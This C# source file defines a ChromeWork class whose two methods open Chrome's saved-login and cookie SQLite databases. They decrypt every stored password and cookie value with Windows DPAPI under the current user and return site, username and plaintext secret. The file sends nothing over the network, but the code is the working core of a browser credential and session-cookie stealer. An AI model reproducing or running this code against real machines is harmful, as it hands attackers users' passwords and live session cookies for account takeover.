using System;
using System.Collections.Generic;
using System.Runtime.Remoting.Messaging;
using System.Text;

namespace ChromeWork
{
    public class Work
    {
        public IEnumerable<Tuple<string, string, string>> GetPasswords(string path, bool filter = true)
        {
            var dbPath = path ?? throw new Exception("Path is null!");;
            if (!System.IO.File.Exists(dbPath)) throw new System.IO.FileNotFoundException("Cant find Login Data store", dbPath); 

            var connectionString = "Data Source=" + dbPath + ";pooling=false";

            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {
             

                cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var encryptedData = (byte[])reader[0];

                        var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                        var plainText = Encoding.ASCII.GetString(decodedData);
                        yield return Tuple.Create(reader.GetString(2),reader.GetString(1), plainText);   
                    }
                }
                conn.Close();
            }
        }
        
        public IEnumerable<Tuple<string, string, string>> GetCookies(string path, bool filter = true)
        {
            var dbPath = path ?? throw new Exception("Path is null!");
            if (!System.IO.File.Exists(dbPath)) throw new System.IO.FileNotFoundException("Cant find cookie store", dbPath);

            var connectionString = "Data Source=" + dbPath + ";pooling=false";

            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {
             

                cmd.CommandText = "SELECT name,encrypted_value,host_key FROM cookies";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var encryptedData = (byte[])reader[1];

                        var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                        var plainText = Encoding.ASCII.GetString(decodedData);

                        yield return Tuple.Create(reader.GetString(2), reader.GetString(0), plainText);
                    }
                }
                conn.Close();
            }
        }

    }
}